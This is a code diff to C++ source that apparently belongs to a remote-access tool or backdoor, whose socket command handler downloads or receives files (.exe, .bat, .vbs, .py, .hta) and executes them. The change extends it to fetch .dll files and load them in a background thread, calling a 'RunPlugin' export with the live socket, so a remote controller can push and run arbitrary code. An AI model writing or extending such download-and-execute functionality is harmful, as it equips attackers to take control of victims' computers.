@@ -8,6 +8,7 @@
 #include <vector>
 #include <fstream>
 #include <algorithm>
+#include <thread>
 #include "../../include/json.hpp"
 
 #pragma comment(lib, "ws2_32.lib")
@@ -44,6 +45,14 @@ string toLower(string str) {
     return str;
 }
 
+// Helper to check if a string ends with a suffix
+bool endsWith(const string& str, const string& suffix) {
+    if (str.length() >= suffix.length()) {
+        return (0 == str.compare(str.length() - suffix.length(), suffix.length(), suffix));
+    }
+    return false;
+}
+
 // Check if file extension is allowed
 bool isAllowedExtension(const string& path) {
     size_t queryPos = path.find('?');
@@ -53,7 +62,7 @@ bool isAllowedExtension(const string& path) {
     if (dotPos == string::npos) return false;
 
     string ext = toLower(cleanPath.substr(dotPos));
-    return (ext == ".exe" || ext == ".bat" || ext == ".vbs" || ext == ".py" || ext == ".hta");
+    return (ext == ".exe" || ext == ".bat" || ext == ".vbs" || ext == ".py" || ext == ".hta" || ext == ".dll");
 }
 
 // Generate file name or random
@@ -96,7 +105,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             }
 
             if (!isAllowedExtension(url)) {
-                sendResponse(sock, "error", "Unsupported file extension in URL. Only .exe, .bat, .vbs, .py, and .hta are allowed.");
+                sendResponse(sock, "error", "Unsupported file extension in URL. Only .exe, .bat, .vbs, .py, .hta, and .dll are allowed.");
                 return;
             }
 
@@ -123,12 +132,28 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
                 return;
             }
 
-            // Execute file
-            HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
-            if ((uintptr_t)hInst <= 32) {
-                sendResponse(sock, "error", "Failed to execute downloaded file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
+            // Execute file or dynamic DLL load
+            if (endsWith(toLower(destFile), ".dll")) {
+                SOCKET currentSock = sock;
+                string currentFile = destFile;
+                thread([currentFile, currentSock]() {
+                    HMODULE hMod = LoadLibraryA(currentFile.c_str());
+                    if (hMod) {
+                        typedef void (*PluginEntry)(SOCKET);
+                        PluginEntry func = (PluginEntry)GetProcAddress(hMod, "RunPlugin");
+                        if (func) {
+                            func(currentSock);
+                        }
+                    }
+                }).detach();
+                sendResponse(sock, "success", "Successfully downloaded and loaded DLL: " + destFile);
             } else {
-                sendResponse(sock, "success", "Successfully downloaded and executed: " + destFile);
+                HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
+                if ((uintptr_t)hInst <= 32) {
+                    sendResponse(sock, "error", "Failed to execute downloaded file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
+                } else {
+                    sendResponse(sock, "success", "Successfully downloaded and executed: " + destFile);
+                }
             }
         }
         else if (action == "remote_execute_local") {
@@ -141,7 +166,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             }
 
             if (!isAllowedExtension(filename)) {
-                sendResponse(sock, "error", "Unsupported file extension. Only .exe, .bat, .vbs, .py, and .hta are allowed.");
+                sendResponse(sock, "error", "Unsupported file extension. Only .exe, .bat, .vbs, .py, .hta, and .dll are allowed.");
                 return;
             }
 
@@ -163,12 +188,28 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             ofs.write((const char*)decodedBytes.data(), decodedBytes.size());
             ofs.close();
 
-            // Execute file
-            HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
-            if ((uintptr_t)hInst <= 32) {
-                sendResponse(sock, "error", "Failed to execute file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
+            // Execute file or dynamic DLL load
+            if (endsWith(toLower(destFile), ".dll")) {
+                SOCKET currentSock = sock;
+                string currentFile = destFile;
+                thread([currentFile, currentSock]() {
+                    HMODULE hMod = LoadLibraryA(currentFile.c_str());
+                    if (hMod) {
+                        typedef void (*PluginEntry)(SOCKET);
+                        PluginEntry func = (PluginEntry)GetProcAddress(hMod, "RunPlugin");
+                        if (func) {
+                            func(currentSock);
+                        }
+                    }
+                }).detach();
+                sendResponse(sock, "success", "Successfully uploaded and loaded DLL: " + destFile);
             } else {
-                sendResponse(sock, "success", "Successfully uploaded and executed: " + destFile);
+                HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
+                if ((uintptr_t)hInst <= 32) {
+                    sendResponse(sock, "error", "Failed to execute file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
+                } else {
+                    sendResponse(sock, "success", "Successfully uploaded and executed: " + destFile);
+                }
             }
         }
         else {
